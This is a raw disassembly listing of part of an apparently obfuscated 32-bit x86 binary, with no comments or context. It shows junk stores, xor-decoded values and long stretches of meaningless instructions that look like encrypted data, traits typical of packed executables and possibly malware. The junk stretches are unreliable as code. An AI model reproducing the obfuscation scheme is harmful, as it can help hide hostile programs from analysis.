  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433603,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433603,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433697,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433603,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4336af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43372b
  40e3da:	and    DWORD PTR ds:0x43360b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433663,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433713
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	repnz mov esi,0x9816f2d0
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3d8
  40e421:	das    
  40e422:	mov    edx,0x25463410
  40e427:	mov    dh,0x59
  40e429:	aad    0x35
  40e42b:	(bad)  [eax]
  40e42d:	push   ss
  40e42e:	adc    cl,al
  40e430:	lods   al,BYTE PTR ds:[esi]
  40e431:	push   ecx
  40e432:	(bad)  
  40e433:	cmp    eax,0x41ea54f0
  40e438:	xchg   ebp,eax
  40e439:	push   ds
  40e43a:	dec    edi
  40e43b:	sbb    edx,ebx
  40e43d:	(bad)  
  40e43f:	sbb    BYTE PTR [edi-0x28],al
  40e442:	andps  xmm6,XMMWORD PTR [edx+0x61]
  40e446:	(bad)  
  40e448:	jge    0x40e3fe
  40e44a:	addr16 jmp 0x40e3ce
  40e44d:	pop    ss
  40e44e:	cmp    BYTE PTR [ecx+0x585bba23],ah
  40e454:	(bad)  
  40e455:	pop    ds
  40e456:	jge    0x40e408
  40e458:	sahf   
  40e459:	(bad)  
  40e45a:	hlt    
  40e45b:	fwait
  40e45c:	push   edi
  40e45d:	xchg   BYTE PTR ss:[edi+0x576fc905],bh
  40e464:	mov    ebx,0xdfc466eb
  40e469:	jne    0x40e442
  40e46b:	push   es
  40e46c:	ret    
  40e46d:	test   DWORD PTR [ebp+0x48],edx
  40e470:	mov    WORD PTR [edi+0x4e2fa770],cs
  40e476:	fisttp DWORD PTR [ebp+0x10831687]
  40e47c:	outs   dx,BYTE PTR ds:[esi]
  40e47d:	sub    DWORD PTR [ebx-0x76],ebx
  40e480:	mov    al,ds:0x9ca1f2cb
  40e485:	daa    
  40e486:	ins    DWORD PTR es:[edi],dx
  40e487:	in     al,0x5a
  40e489:	sub    eax,0x302b3441
  40e48e:	in     al,dx
  40e48f:	mov    ebx,0xf5608157
  40e494:	inc    edx
  40e495:	jmp    0x5f3ffa50
  40e49a:	bound  eax,QWORD PTR [ebx-0x6ae28de9]
  40e4a0:	enter  0x41de,0x4c
  40e4a4:	lods   eax,DWORD PTR ds:[esi]
  40e4a5:	ror    DWORD PTR [esi],0xea
  40e4a8:	cmp    dl,BYTE PTR [ecx-0x8]
  40e4ab:	retf   0xb96
  40e4ae:	adc    BYTE PTR [eax-0x6d],ch
  40e4b1:	int    0xc1
  40e4b3:	xor    eax,edi
  40e4b5:	or     ch,BYTE PTR [eax]
  40e4b7:	dec    eax
  40e4b8:	aam    0x7b
  40e4ba:	jp     0x40e4b3
  40e4bc:	pop    ebp
  40e4bd:	xchg   ebp,eax
  40e4be:	cmp    al,0x9a
  40e4c0:	cli    
  40e4c1:	sbb    eax,0x26364e40
  40e4c6:	mov    BYTE PTR [ebp+0x63287e1],0xe
  40e4cd:	jne    0x40e508
  40e4cf:	loopne 0x40e507
  40e4d1:	retf   0x6129
  40e4d4:	xor    eax,0x1e9ece5c
  40e4d9:	int3   
  40e4da:	loopne 0x40e4d5
  40e4dc:	push   ebp
  40e4dd:	push   ebp
  40e4de:	aaa    
  40e4df:	add    eax,0xef596157
  40e4e4:	shl    DWORD PTR [eax-0x35aaa28],1
  40e4ea:	mov    dh,BYTE PTR [ebp-0x41e2ad0e]
  40e4f0:	test   eax,0xdce4e49f
  40e4f5:	stos   DWORD PTR es:[edi],eax
  40e4f6:	fstp   DWORD PTR [ecx-0x59]
  40e4f9:	or     DWORD PTR [ebp+0x48],edx
  40e4fc:	xor    BYTE PTR [edx],ah
  40e4fe:	mov    ecx,0x45204e89
  40e503:	dec    esp
  40e504:	cmp    al,0x70
  40e506:	mov    ds:0x82215aff,eax
  40e50b:	mov    esi,0x295ddde9
  40e510:	aaa    
  40e511:	lods   eax,DWORD PTR ds:[esi]
  40e512:	stos   BYTE PTR es:[edi],al
  40e513:	call   0xd93cd232
  40e518:	sub    bl,bl
  40e51a:	ja     0x40e54a
  40e51c:	jl     0x40e4c8
  40e51e:	push   ss
  40e51f:	pop    eax
  40e520:	ror    DWORD PTR [esi],1
  40e522:	adc    al,0x46
  40e524:	outs   dx,DWORD PTR ds:[esi]
  40e525:	ds sbb dl,bh
  40e528:	xchg   esp,eax
  40e529:	jp     0x40e51c
  40e52b:	xchg   esp,eax
  40e52c:	xchg   esp,eax
  40e52d:	imul   esi,DWORD PTR gs:[edi],0x879849cd
  40e534:	pop    eax
  40e535:	mov    ebp,0x601830b5
  40e53a:	xlat   BYTE PTR ds:[ebx]
  40e53b:	cmc    
  40e53c:	mov    eax,DWORD PTR [ebp-0xc]
  40e53f:	or     DWORD PTR ds:0x4336a3,0x4336eb
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x4336db,0x4336af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x1cf261b8
  40e5b4:	xchg   ecx,eax
  40e5b5:	and    al,0x6a
  40e5b7:	sub    bl,BYTE PTR [ecx+0x7f127e7e]
  40e5bd:	jle    0x40e63d
  40e5bf:	out    0x78,eax
  40e5c1:	pop    ebp
  40e5c2:	jl     0x40e63f
  40e5c4:	jne    0x40e592
  40e5c6:	xchg   ecx,eax
  40e5c7:	push   esi
  40e5c8:	(bad)  
  40e5c9:	jbe    0x40e5c4
  40e5cb:	neg    BYTE PTR [esi+0x116015b7]
  40e5d1:	cmp    eax,0x7106aebe
  40e5d6:	jns    0x40e61d
  40e5d8:	or     al,BYTE PTR [edx]
  40e5da:	adc    edi,esi
  40e5dc:	aad    0x86
  40e5de:	(bad)
  40e5e1:	les    edx,FWORD PTR cs:[esi+eax*8]
  40e5e5:	scas   eax,DWORD PTR es:[edi]
  40e5e6:	mov    ebx,0xa25bbeb7
  40e5eb:	cdq    
  40e5ec:	dec    edx
  40e5ed:	push   cs
  40e5ee:	mov    edx,0x4c6e9fb6
  40e5f3:	push   esi
  40e5f4:	inc    esi
  40e5f5:	xchg   ecx,eax
  40e5f6:	out    0xf8,eax
  40e5f8:	aad    0xf9
  40e5fa:	jle    0x40e62c
  40e5fc:	jge    0x40e5e1
  40e5fe:	lock out dx,eax
  40e600:	inc    eax
  40e601:	dec    edi
  40e602:	fimul  WORD PTR [esi-0x6c]
  40e605:	outs   dx,DWORD PTR ds:[esi]
  40e606:	leave  
  40e607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e608:	out    0x54,al
  40e60a:	xor    dh,BYTE PTR [esi-0x575f2b69]
  40e610:	sub    ch,BYTE PTR [edi]
  40e612:	xor    bl,BYTE PTR ds:0x2169dcf2
  40e618:	xor    BYTE PTR ds:0x1b3f2a81,ah
  40e61e:	pop    ecx
  40e61f:	xor    al,0x4
  40e621:	mov    bh,BYTE PTR [edi-0xe65ad22]
  40e627:	popf   
  40e628:	add    al,0x23
  40e62a:	pop    edi
  40e62b:	add    ebp,DWORD PTR [edx-0x2fdb60d3]
  40e631:	into   
  40e632:	adc    al,0x1a
  40e634:	inc    eax
  40e635:	sub    dh,BYTE PTR ds:0x41c37207
  40e63b:	ret    
  40e63c:	push   edx
  40e63d:	push   esp
  40e63e:	jne    0x40e68b
  40e640:	test   DWORD PTR [ebp+0x508912ab],0x90fa8136
  40e64a:	adc    al,0x28
  40e64c:	retf   0xa20c
  40e64f:	xor    BYTE PTR ds:0x15ccf354,cl
  40e655:	ds pop ss
  40e657:	mov    cl,0xde
  40e659:	sbb    BYTE PTR ds:0xe7e8f1d1,0xa3
  40e660:	xor    BYTE PTR [edi+0x67],ah
  40e663:	ret    
  40e664:	shr    DWORD PTR [edi],0x1
  40e667:	mov    ch,0x41
  40e669:	adc    eax,0xeb622851
  40e66e:	sub    BYTE PTR [esi+0x35cb1bfd],al
  40e674:	pop    eax
  40e675:	imul   al
  40e677:	mov    WORD PTR [edx-0x18],es
  40e67a:	adc    al,0xbb
  40e67c:	adc    ebp,ebx
  40e67e:	xor    DWORD PTR [edx-0x11e6aa10],0xeda0aaa6
  40e688:	and    al,0x8
  40e68a:	push   cs
  40e68b:	adc    BYTE PTR [edx-0x74],al
  40e68e:	xor    eax,0x5bf5cff5
  40e693:	xchg   BYTE PTR ds:0x65dfe24d,bl
  40e699:	mov    WORD PTR [esp+esi*2-0x41f0785f],cs
  40e6a0:	mov    BYTE PTR [edx-0x50f44f83],dh
  40e6a6:	mov    ecx,0x32fd6884
  40e6ab:	mov    bl,0xf4
  40e6ad:	mov    dl,0x93
  40e6af:	mov    ch,0xf7
  40e6b1:	pop    DWORD PTR [ecx+eax*2]
  40e6b4:	jbe    0x40e6e6
  40e6b6:	repnz or DWORD PTR [edx+0xb],edi
  40e6ba:	add    eax,0xbc627c34
  40e6bf:	imul   ecx,DWORD PTR [edi-0x6e427701],0xffffffa5
  40e6c6:	call   0x4d46:0x4eea75b9
  40e6cd:	add    eax,0xebb248c5
  40e6d2:	sbb    BYTE PTR [ecx+0x1a],bl
  40e6d5:	dec    eax
  40e6d6:	cmc    
  40e6d7:	mov    WORD PTR [ebp-0x3],cs
  40e6da:	jl     0x40e67d
  40e6dc:	xor    al,0x3b
  40e6de:	inc    ecx
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx-0x762902f]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e68d
  40e704:	xor    esi,DWORD PTR [ecx-0x17]
  40e707:	cli    
  40e708:	push   edi
  40e709:	inc    esp
  40e70a:	rcr    BYTE PTR [eax+eax*1-0x7f3b8f9e],1
  40e711:	sub    DWORD PTR [eax-0x430c5477],0x46
  40e718:	jp     0x40e782
  40e71a:	and    BYTE PTR [edi+0x42],ch
  40e71d:	mov    esp,0x364c3b62
  40e722:	mov    cl,0xd6
  40e724:	pop    ds
  40e725:	loop   0x40e78e
  40e727:	mov    ebx,0x9e325c7a
  40e72c:	rcr    DWORD PTR ds:0x3bf68bc6,cl
  40e732:	cs jg  0x40e6d1
  40e735:	sar    DWORD PTR [eax+0x71],cl
  40e738:	adc    ebx,DWORD PTR [edi]
  40e73a:	push   es
  40e73b:	jl     0x40e730
  40e73d:	xchg   edi,eax
  40e73e:	ins    BYTE PTR es:[edi],dx
  40e73f:	inc    ebx
  40e740:	push   ebx
  40e741:	dec    eax
  40e742:	dec    ecx
  40e743:	enter  0xbc00,0xdc
  40e747:	push   ss
  40e748:	xlat   BYTE PTR ds:[ebx]
  40e749:	and    al,0x3c
  40e74b:	repnz iret 
  40e74d:	or     al,0x9d
  40e74f:	sbb    ecx,esi
  40e751:	xchg   BYTE PTR ds:0x42eeeaf9,dh
  40e757:	push   ecx
  40e758:	jecxz  0x40e767
  40e75a:	push   esi
  40e75b:	add    al,0xef
  40e75d:	pop    es
  40e75e:	jmp    0x40e7dd
  40e760:	push   es
  40e761:	rol    cl,0x66
  40e764:	loop   0x40e720
  40e766:	aad    0x3f
  40e768:	and    dh,ah
  40e76a:	dec    esp
  40e76b:	repnz sti 
  40e76d:	adc    eax,DWORD PTR [edx-0x4d]
  40e770:	and    eax,0x11a9e385
  40e775:	pushf  
  40e776:	dec    edx
  40e777:	push   eax
  40e778:	mov    ds:0x8027d1b2,eax
  40e77d:	adc    al,BYTE PTR [eax-0x553ff966]
  40e783:	shr    DWORD PTR [esi],0xcb
  40e786:	pop    esi
  40e787:	in     eax,0x15
  40e789:	outs   dx,BYTE PTR ds:[esi]
  40e78a:	loopne 0x40e711
  40e78c:	mov    dh,0x93
  40e78e:	cmp    BYTE PTR [eax+0x58],dh
  40e791:	push   ecx
  40e792:	sahf   
  40e793:	push   es
  40e794:	inc    ebp
  40e795:	ror    DWORD PTR [ebx],cl
  40e797:	in     eax,dx
  40e798:	inc    esi
  40e799:	int3   
  40e79a:	adc    al,0x24
  40e79c:	daa    
  40e79d:	xor    ecx,edi
  40e79f:	sub    BYTE PTR [eax+ebx*2+0x584dd2ac],0x3e
  40e7a7:	adc    ebp,DWORD PTR [edi]
  40e7a9:	stc    
  40e7aa:	ret    0x4e82
  40e7ad:	xchg   edi,eax
  40e7ae:	leave  
  40e7af:	cli    
  40e7b0:	adc    eax,0xffffff9d
  40e7b3:	addr16 in eax,0x1b
  40e7b6:	add    BYTE PTR [ecx+0x57],bh
  40e7b9:	dec    edx
  40e7ba:	cmp    esi,DWORD PTR [ebx-0x4e]
  40e7bd:	ja     0x40e7a7
  40e7bf:	jnp    0x40e79f
  40e7c1:	dec    edi
  40e7c2:	(bad)  
  40e7c3:	mov    ah,al
  40e7c5:	fptan  
  40e7c7:	call   0xa66b1f34
  40e7cc:	push   ebp
  40e7cd:	icebp  
  40e7ce:	cmp    ebx,edx
  40e7d0:	out    0x1f,eax
  40e7d2:	xchg   ecx,eax
  40e7d3:	push   0xffffff8c
  40e7d5:	dec    esp
  40e7d6:	in     eax,0x88
  40e7d8:	sar    BYTE PTR [ebp-0x3ead7dad],0x48
  40e7df:	cmp    edx,DWORD PTR [ebp+ebx*4+0x5efb99bc]
  40e7e6:	repnz popf 
  40e7e8:	loope  0x40e860
  40e7ea:	xor    eax,0xab35c382
  40e7ef:	je     0x40e787
  40e7f1:	xchg   edi,eax
  40e7f2:	es or  eax,0x82b0d790
  40e7f8:	or     BYTE PTR [ebx-0x6598387],0x8
  40e7ff:	or     eax,0xdd2dc032
  40e804:	out    0xb9,al
  40e806:	arpl   WORD PTR [edx-0x25],bx
  40e809:	ins    DWORD PTR es:[edi],dx
  40e80a:	xor    cl,ch
  40e80c:	push   cs
  40e80d:	je     0x40e806
  40e80f:	(bad)  
  40e811:	mov    ds:0x5be4f338,eax
  40e816:	mov    dl,0xab
  40e818:	inc    edx
  40e819:	stc    
  40e81a:	mov    cl,0x11
  40e81c:	inc    esi
  40e81d:	mov    esi,DWORD PTR [ecx+ecx*4+0x45]
  40e821:	cld    
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e892
  40e854:	stos   BYTE PTR es:[edi],al
  40e855:	hlt    
  40e856:	and    esp,edx
  40e858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e8a6
  40e860:	inc    ecx
  40e861:	mov    ebx,0x6dceedfe
  40e866:	dec    edi
  40e867:	(bad)  
  40e868:	mov    bl,0x6e
  40e86a:	fwait
  40e86b:	clc    
  40e86c:	cmp    BYTE PTR [ebx],bh
  40e86e:	and    DWORD PTR [esi-0x26],eax
  40e871:	fisttp QWORD PTR [edx-0x50d59763]
  40e877:	mov    cl,0x84
  40e879:	dec    eax
  40e87a:	test   al,0x25
  40e87c:	push   0x27c28ef2
  40e881:	push   esp
  40e882:	call   0xe6210bd8
  40e887:	nop
  40e888:	and    eax,0x262e63ba
  40e88d:	out    dx,al
  40e88e:	idiv   DWORD PTR [esi-0x2c]
  40e891:	xchg   edx,eax
  40e892:	es or  eax,0xfffffff0
  40e896:	(bad)  
  40e897:	cli    
  40e898:	xchg   BYTE PTR [ebx+eiz*1],dl
  40e89b:	mov    esi,0x44f3a185
  40e8a0:	mov    ebx,0x174d96d0
  40e8a5:	pop    ecx
  40e8a6:	outs   dx,BYTE PTR ds:[esi]
  40e8a7:	jge    0x40e891
  40e8a9:	dec    ecx
  40e8aa:	jge    0x40e91e
  40e8ac:	pop    ebp
  40e8ad:	push   ss
  40e8ae:	xor    al,0xc1
  40e8b0:	push   edi
  40e8b1:	jge    0x40e90f
  40e8b3:	mov    al,ds:0x24b1bea6
  40e8b8:	into   
  40e8b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8ba:	xchg   edi,eax
  40e8bb:	adc    DWORD PTR [edi],ebp
  40e8bd:	inc    esp
  40e8be:	mov    ah,BYTE PTR [edi]
  40e8c0:	mov    ebx,DWORD PTR [ecx-0x10]
  40e8c3:	jns    0x40e925
  40e8c5:	pop    edi
  40e8c6:	shl    DWORD PTR [bp+si],cl
  40e8c9:	std    
  40e8ca:	loopne 0x40e8e6
  40e8cc:	fldcw  WORD PTR [ecx+ecx*2]
  40e8cf:	push   0xffffffdb
  40e8d1:	out    0xd8,al
  40e8d3:	out    0xf,al
  40e8d5:	lods   al,BYTE PTR ds:[esi]
  40e8d6:	or     bh,dh
  40e8d8:	neg    BYTE PTR [esi+esi*8-0x4b02e65f]
  40e8df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8e0:	stos   DWORD PTR es:[edi],eax
  40e8e1:	(bad)  
  40e8e2:	xor    eax,0x6e933a7
  40e8e7:	sbb    DWORD PTR [eax+ebp*4+0x5acf64b1],0x6f1d4cb8
  40e8f2:	jo     0x40e96f
  40e8f4:	push   edx
  40e8f5:	adc    ah,dh
  40e8f7:	inc    edx
  40e8f8:	mov    esp,0x4bbb6ff2
  40e8fd:	jle    0x40e8c7
  40e8ff:	push   0x118e3c0e
  40e904:	jmp    0x40e88f
  40e906:	daa    
  40e907:	lock add ebx,ebp
  40e90a:	cmp    BYTE PTR [edi-0x5a],ch
  40e90d:	popa   
  40e90e:	out    dx,eax
  40e90f:	sti    
  40e910:	loop   0x40e93b
  40e912:	test   eax,0x6ef91554
  40e917:	jae    0x40e8a8
  40e919:	pop    edx
  40e91a:	mov    edx,0x120542a4
  40e91f:	pop    es
  40e920:	cvtps2pi mm7,QWORD PTR [eax]
  40e923:	nop
  40e924:	xchg   esi,eax
  40e925:	and    eax,0x40e774d3
  40e92a:	pop    ecx
  40e92b:	(bad)  
  40e92d:	push   edi
  40e92e:	ds and al,0xa9
  40e931:	xor    BYTE PTR [ecx+ebp*1-0x407d6a13],dh
  40e938:	mov    ds:0xe932af80,al
  40e93d:	and    BYTE PTR [ebx+eax*8],cl
  40e940:	push   ds
  40e941:	jecxz  0x40e96c
  40e943:	xor    eax,0xdc96fccc
  40e948:	dec    esi
  40e949:	push   ds
  40e94a:	hlt    
  40e94b:	sahf   
  40e94c:	retf   
  40e94d:	repz jb 0x40e993
  40e950:	into   
  40e951:	mov    ecx,0x22f60125
  40e956:	shr    BYTE PTR [edi-0x7801167d],cl
  40e95c:	rol    BYTE PTR es:[edx],0xb1
  40e960:	xchg   eax,esi
  40e962:	lgs    ebp,FWORD PTR [edx+0x50646005]
  40e969:	pop    edi
  40e96a:	cmp    al,BYTE PTR [esi-0x681b62b8]
  40e970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e971:	or     DWORD PTR [eax+eiz*8],ebx
  40e974:	test   ecx,ecx
  40e976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e978:	jmp    0x40e9d1
  40e97a:	fimul  WORD PTR [edi]
  40e97c:	test   DWORD PTR [esi],edi
  40e97e:	stc    
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x50dd771d
  40e99c:	into   
  40e99d:	xchg   BYTE PTR [esi+edi*2+0x7e7f127e],ah
  40e9a4:	jle    0x40ea24
  40e9a6:	(bad)  [ecx-0x5cbe37]
  40e9ac:	jnp    0x40e9be
  40e9ae:	pusha  
  40e9af:	test   al,0xb2
  40e9b1:	(bad)  
  40e9b3:	inc    esp
  40e9b4:	push   cs
  40e9b5:	or     ecx,DWORD PTR [eax-0x77]
  40e9b8:	test   BYTE PTR [edx+0x3dee4287],dl
  40e9be:	ret    
  40e9bf:	mov    ah,0x3
  40e9c1:	cmp    DWORD PTR [ecx+0x7115742c],0xb5b51992
  40e9cb:	icebp  
  40e9cc:	xor    ah,bl
  40e9ce:	fcomp  QWORD PTR [edi-0x9f236d4]
  40e9d4:	pop    ebx
  40e9d5:	in     eax,0x5b
  40e9d7:	inc    edi
  40e9d8:	mov    BYTE PTR [ecx+0x70cd73d9],0x4f
  40e9df:	outs   dx,BYTE PTR ds:[esi]
  40e9e0:	cmp    DWORD PTR [edi],ebp
  40e9e2:	pop    eax
  40e9e3:	sahf   
  40e9e4:	int3   
  40e9e5:	call   FWORD PTR [esi+0x2bdcf519]
  40e9eb:	loopne 0x40ea32
  40e9ed:	into   
  40e9ee:	inc    ebx
  40e9ef:	push   ebp
  40e9f0:	xor    al,0x3d
  40e9f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f3:	xor    DWORD PTR [eax+0x4c8c4329],edx
  40e9f9:	and    ebp,DWORD PTR ds:0x97f6fdde
  40e9ff:	fstp   QWORD PTR [edx]
  40ea01:	les    eax,FWORD PTR [eax-0x47]
  40ea04:	mov    bh,0x33
  40ea06:	add    eax,0x708007fc
  40ea0b:	popa   
  40ea0c:	popa   
  40ea0d:	in     al,0x11
  40ea0f:	sahf   
  40ea10:	adc    eax,0xc57ceab5
  40ea15:	outs   dx,BYTE PTR ds:[esi]
  40ea16:	xchg   ecx,eax
  40ea17:	mov    WORD PTR [eax],fs
  40ea19:	loopne 0x40ea5e
  40ea1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea1c:	sbb    eax,0xe83f361f
  40ea21:	add    dh,0x2e
  40ea24:	int    0x99
  40ea26:	xchg   edx,eax
  40ea27:	out    dx,eax
  40ea28:	bnd addr16 ret 0xa755
  40ea2d:	sub    BYTE PTR [ecx-0x96b0832],bl
  40ea33:	repz fmul DWORD PTR [eax]
  40ea36:	mov    ds,WORD PTR [eax]
  40ea38:	and    esp,DWORD PTR [esi+eax*8]
  40ea3b:	add    eax,0x6a8e4833
  40ea41:	mov    dl,0x4a
  40ea43:	mov    eax,ds:0xa5328d0e
  40ea48:	cmp    ebp,DWORD PTR [ebp-0x2816164d]
  40ea4e:	out    0x92,eax
  40ea50:	mov    ebx,0x46583713
  40ea55:	mov    edi,0x8afb1c32
  40ea5a:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40ea5c:	stc    
  40ea5d:	fwait
  40ea5e:	cmp    DWORD PTR [esi+0x23e1fd2d],ebp
  40ea64:	xor    BYTE PTR [edx-0x5c],0x10
  40ea68:	in     eax,0x8f
  40ea6a:	lock mov al,0x77
  40ea6d:	inc    esp
  40ea6e:	nop
  40ea6f:	(bad)  
  40ea71:	test   eax,0x2af817d
  40ea76:	or     eax,0xd81f0ced
  40ea7b:	jl     0x40ea72
  40ea7d:	mov    cl,0xbe
  40ea7f:	ins    DWORD PTR es:[edi],dx
  40ea80:	ret    0xb7e9
  40ea83:	xor    bh,cl
  40ea85:	js     0x40ea9c
  40ea87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea88:	inc    ebp
  40ea89:	pushw  ds
  40ea8b:	sbb    al,0xe2
  40ea8d:	fdiv   QWORD PTR [edi]
  40ea8f:	mov    eax,ds:0x55b3976c
  40ea94:	fdivr  st,st(7)
  40ea96:	loop   0x40ea81
  40ea98:	push   esp
  40ea99:	(bad)  
  40ea9a:	cmpxchg BYTE PTR [eax-0x66b1b2b8],bl
  40eaa1:	push   cs
  40eaa2:	pusha  
  40eaa3:	ins    DWORD PTR es:[edi],dx
  40eaa4:	(bad)  
  40eaa5:	mov    dl,0x55
  40eaa7:	and    BYTE PTR [edx],0xba
  40eaaa:	cmp    esp,DWORD PTR [ebx+0xb]
  40eaad:	and    eax,0x9fe127d0
  40eab2:	test   al,0x87
  40eab4:	dec    esi
  40eab5:	int    0x8
  40eab7:	or     bh,bl
  40eab9:	lea    esi,[ebp-0x21]
  40eabc:	ins    DWORD PTR es:[edi],dx
  40eabd:	xor    al,0xad
  40eabf:	aam    0x8c
  40eac1:	add    eax,ebx
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433693,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433693,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433693,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433693,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433693
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433693,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433693
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433693,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4336d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4336d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4336d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4336d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4336d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4336e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43369b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43372b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    bl,BYTE PTR [edx]
  40ebb4:	xchg   ebp,eax
  40ebb5:	in     eax,dx
  40ebb6:	retf   0xa59a
